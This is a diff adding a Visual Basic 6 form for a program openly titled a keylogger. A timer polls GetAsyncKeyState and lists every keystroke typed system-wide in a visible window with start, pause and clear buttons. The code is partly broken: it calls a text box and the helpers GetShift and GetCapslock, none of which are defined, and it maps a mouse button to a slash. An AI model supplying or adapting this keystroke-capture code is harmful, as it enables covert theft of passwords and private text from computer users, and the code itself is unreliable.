@@ -1,0 +1,372 @@
+VERSION 5.00
+Begin VB.Form Form1 
+   BorderStyle     =   1  'Fixed Single
+   Caption         =   "VB Keylogger By George Papadopoulos"
+   ClientHeight    =   3960
+   ClientLeft      =   45
+   ClientTop       =   330
+   ClientWidth     =   5940
+   LinkTopic       =   "Form1"
+   MaxButton       =   0   'False
+   MinButton       =   0   'False
+   ScaleHeight     =   3960
+   ScaleWidth      =   5940
+   StartUpPosition =   2  'CenterScreen
+   Begin VB.CommandButton Command5 
+      Caption         =   "Minimize"
+      Height          =   375
+      Left            =   3960
+      TabIndex        =   6
+      Top             =   3480
+      Width           =   975
+   End
+   Begin VB.CommandButton Command4 
+      Caption         =   "Quit"
+      Height          =   375
+      Left            =   5040
+      TabIndex        =   4
+      Top             =   3480
+      Width           =   735
+   End
+   Begin VB.CommandButton Command3 
+      Caption         =   "Clear"
+      Height          =   375
+      Left            =   2880
+      TabIndex        =   3
+      Top             =   3480
+      Width           =   975
+   End
+   Begin VB.CommandButton Command2 
+      Caption         =   "Pause"
+      Enabled         =   0   'False
+      Height          =   375
+      Left            =   1440
+      TabIndex        =   2
+      Top             =   3480
+      Width           =   1335
+   End
+   Begin VB.CommandButton Command1 
+      Caption         =   "Start"
+      Height          =   375
+      Left            =   120
+      TabIndex        =   1
+      Top             =   3480
+      Width           =   1215
+   End
+   Begin VB.ListBox List1 
+      Columns         =   10
+      Height          =   2985
+      Left            =   120
+      TabIndex        =   0
+      Top             =   360
+      Width           =   5655
+   End
+   Begin VB.Timer Timer1 
+      Enabled         =   0   'False
+      Interval        =   1
+      Left            =   6000
+      Top             =   840
+   End
+   Begin VB.Label Label1 
+      Caption         =   "Keys Pressed :"
+      Height          =   255
+      Left            =   120
+      TabIndex        =   5
+      Top             =   120
+      Width           =   1815
+   End
+End
+Attribute VB_Name = "Form1"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = False
+Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer
+
+Private Sub Command1_Click()
+Command1.Enabled = False
+Command2.Enabled = True
+Timer1.Enabled = True
+End Sub
+
+Private Sub Command2_Click()
+Command1.Enabled = True
+Command2.Enabled = False
+Timer1.Enabled = False
+End Sub
+
+Private Sub Command3_Click()
+List1.Clear
+End Sub
+
+Private Sub Command4_Click()
+MsgBox "Keylogger By George Papadopoulos"
+End
+End Sub
+
+Private Sub Command5_Click()
+Me.WindowState = 1
+End Sub
+
+Private Sub Form_Load()
+MsgBox "Keylogger By George Papadopoulos"
+End Sub
+
+Private Sub Timer1_Timer()
+If List1.ListCount = 0 Then Command3.Enabled = False Else Command3.Enabled = True
+Dim FoundKeys As String
+
+On Error Resume Next
+
+    Dim AddKey
+    
+    KeyResult = GetAsyncKeyState(13)
+    If KeyResult = -32767 Then
+        AddKey = vbCrLf
+        GoTo KeyFound
+    End If
+    KeyResult = GetAsyncKeyState(8)
+    If KeyResult = -32767 Then
+        l = Len(Text1.Text)
+        AddKey = "[Backspace]"
+        GoTo KeyFound
+    End If
+   
+     
+    
+'------------FUNCTION KEYS
+'------------SPECIAL KEYS
+
+KeyResult = GetAsyncKeyState(32)
+    If KeyResult = -32767 Then
+        AddKey = " "
+        GoTo KeyFound
+    End If
+    
+KeyResult = GetAsyncKeyState(186)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = ";" Else AddKey = ":"
+        GoTo KeyFound
+    End If
+ 
+KeyResult = GetAsyncKeyState(187)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "=" Else AddKey = "+"
+        GoTo KeyFound
+    End If
+  
+KeyResult = GetAsyncKeyState(188)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "," Else AddKey = "<"
+       GoTo KeyFound
+    End If
+   
+KeyResult = GetAsyncKeyState(189)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "-" Else AddKey = "_"
+        GoTo KeyFound
+    End If
+  
+KeyResult = GetAsyncKeyState(190)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "." Else AddKey = ">"
+        GoTo KeyFound
+    End If
+ 
+KeyResult = GetAsyncKeyState(191)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "/" Else AddKey = "?"   '/
+        GoTo KeyFound
+    End If
+  
+KeyResult = GetAsyncKeyState(192)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "`" Else AddKey = "~"       '`
+        GoTo KeyFound
+    End If
+     
+
+
+'----------NUM PAD
+KeyResult = GetAsyncKeyState(96)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "0" Else AddKey = ")"
+        GoTo KeyFound
+    End If
+ 
+KeyResult = GetAsyncKeyState(97)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "1" Else AddKey = "!"
+        GoTo KeyFound
+    End If
+     
+
+KeyResult = GetAsyncKeyState(98)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "2" Else AddKey = "@"
+        GoTo KeyFound
+    End If
+ 
+KeyResult = GetAsyncKeyState(99)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "3" Else AddKey = "#"
+        GoTo KeyFound
+    End If
+    
+    
+KeyResult = GetAsyncKeyState(100)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "4" Else AddKey = "$"
+        GoTo KeyFound
+    End If
+ 
+KeyResult = GetAsyncKeyState(101)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "5" Else AddKey = "%"
+        GoTo KeyFound
+    End If
+    
+    
+KeyResult = GetAsyncKeyState(102)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "6" Else AddKey = "^"
+        GoTo KeyFound
+    End If
+ 
+KeyResult = GetAsyncKeyState(103)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "7" Else AddKey = "&"
+        GoTo KeyFound
+    End If
+    
+    
+KeyResult = GetAsyncKeyState(104)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "8" Else AddKey = "*"
+        GoTo KeyFound
+    End If
+ 
+KeyResult = GetAsyncKeyState(105)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "9" Else AddKey = "("
+        GoTo KeyFound
+    End If
+       
+    
+KeyResult = GetAsyncKeyState(106)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "*" Else AddKey = ""
+        GoTo KeyFound
+    End If
+ 
+KeyResult = GetAsyncKeyState(107)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "=" Else AddKey = "+"
+        GoTo KeyFound
+    End If
+    
+KeyResult = GetAsyncKeyState(108)
+    If KeyResult = -32767 Then
+        AddKey = ""
+        If GetShift = False Then Text1.Text = Text1.Text & vbCrLf
+        GoTo KeyFound
+    End If
+ 
+KeyResult = GetAsyncKeyState(109)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "-" Else AddKey = "_"
+        GoTo KeyFound
+    End If
+    
+KeyResult = GetAsyncKeyState(110)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "." Else AddKey = ">"
+        GoTo KeyFound
+    End If
+ 
+KeyResult = GetAsyncKeyState(2)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "/" Else AddKey = "?"
+        GoTo KeyFound
+    End If
+
+KeyResult = GetAsyncKeyState(220)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "\" Else AddKey = "|"
+        GoTo KeyFound
+    End If
+
+KeyResult = GetAsyncKeyState(222)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "'" Else AddKey = Chr(34)
+        GoTo KeyFound
+    End If
+
+KeyResult = GetAsyncKeyState(221)
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "]" Else AddKey = "}"
+        
+        
+        GoTo KeyFound
+    End If
+    
+KeyResult = GetAsyncKeyState(219) '219
+    If KeyResult = -32767 Then
+        If GetShift = False Then AddKey = "[" Else AddKey = "{"
+        GoTo KeyFound
+    End If
+
+
+
+For n = 65 To 128
+    KeyResult = GetAsyncKeyState(n)
+    If KeyResult = -32767 Then
+        If GetShift = False Then
+            If GetCapslock = True Then AddKey = UCase(Chr(n)) Else AddKey = LCase(Chr(n))
+        Else
+            If GetCapslock = False Then AddKey = UCase(Chr(n)) Else AddKey = LCase(Chr(n))
+        End If
+        GoTo KeyFound
+    End If
+Next n
+
+
+For n = 48 To 57
+    KeyResult = GetAsyncKeyState(n)
+    If KeyResult = -32767 Then
+        If GetShift = True Then
+            Select Case Val(Chr(n))
+                Case 1
+                    AddKey = "!"
+                Case 2
+                    AddKey = "@"
+                Case 3
+                    AddKey = "#"
+                Case 4
+                    AddKey = "$"
+                Case 5
+                    AddKey = "%"
+                Case 6
+                    AddKey = "^"
+                Case 7
+                    AddKey = "&"
+                Case 8
+                    AddKey = "*"
+                Case 9
+                    AddKey = "("
+                Case 0
+                    AddKey = ")"
+            End Select
+        Else
+            AddKey = Chr(n)
+        End If
+        GoTo KeyFound
+    End If
+Next n
+DoEvents
+Exit Sub
+
+KeyFound:
+If AddKey <> "" Then List1.AddItem AddKey
+DoEvents
+End Sub
